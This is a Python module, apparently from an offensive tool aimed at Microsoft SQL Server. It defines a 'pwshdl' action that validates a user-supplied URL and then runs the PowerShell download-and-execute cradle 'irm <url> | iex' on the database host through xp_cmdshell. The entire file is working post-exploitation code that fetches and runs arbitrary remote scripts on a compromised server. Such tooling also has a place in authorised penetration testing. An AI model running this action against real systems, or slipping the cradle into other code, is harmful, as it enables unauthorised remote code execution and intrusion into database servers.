"""
RemotePowerShell action for downloading and executing remote PowerShell scripts via xp_cmdshell.
"""

from typing import Optional, List
from urllib.parse import urlparse
from loguru import logger

from ..execution.powershell import PowerShell
from ..factory import ActionFactory
from ...services.database import DatabaseContext


@ActionFactory.register(
    "pwshdl",
    "Download and execute a PowerShell script from a remote URL via xp_cmdshell",
)
class RemotePowerShell(PowerShell):
    """
    Download and execute a PowerShell script from a remote URL using xp_cmdshell.

    This action uses PowerShell's Invoke-RestMethod (irm) to download a script
    from a URL and immediately execute it using Invoke-Expression (iex).
    The PowerShell command is Base64-encoded for reliable execution.
    """

    def __init__(self):
        super().__init__()
        self._url: Optional[str] = None

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate that a script URL is provided and properly formatted.

        Args:
            additional_arguments: The URL of the PowerShell script to download and execute

        Raises:
            ValueError: If no URL is provided or URL is invalid
        """
        if not additional_arguments or not additional_arguments.strip():
            raise ValueError("RemotePowerShell action requires a script URL.")

        url = additional_arguments.strip()

        # Parse and validate the URL
        try:
            parsed = urlparse(url)

            # If no scheme provided, default to http://
            if not parsed.scheme:
                logger.info("No scheme provided, defaulting to http://")
                url = f"http://{url}"
                parsed = urlparse(url)

            # Validate scheme
            if parsed.scheme not in ("http", "https"):
                raise ValueError(
                    f"Invalid URL scheme '{parsed.scheme}'. Only http:// and https:// are supported."
                )

            # Check if netloc (domain/host) is present
            if not parsed.netloc:
                raise ValueError(
                    "URL must include a valid host/domain"
                )  # Optional: Check if path exists (script filename)
            if not parsed.path or parsed.path == "/":
                logger.warning(
                    "URL does not specify a script path. Ensure the server returns valid PowerShell code."
                )

        except ValueError:
            raise
        except Exception as e:
            raise ValueError(f"Invalid URL format: {e}")

        self._url = url

    def execute(self, database_context: DatabaseContext) -> Optional[List[str]]:
        """
        Execute the PowerShell command to download and run the script from the URL.

        The script is downloaded using Invoke-RestMethod and executed using
        Invoke-Expression, all Base64-encoded for reliable execution.

        Args:
            database_context: The database context containing QueryService and ConfigService

        Returns:
            A list of strings containing the command output, or None on error
        """
        logger.info(
            f"Downloading and executing PowerShell script from URL: {self._url}"
        )

        # Craft the PowerShell command to download and execute the script
        # irm = Invoke-RestMethod, iex = Invoke-Expression
        powershell_command = f"irm {self._url} | iex"

        # Set the crafted PowerShell command in the parent class
        super().validate_arguments(powershell_command)

        # Call the parent's execute method to execute the command
        return super().execute(database_context)

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["URL of PowerShell script to download and execute"]
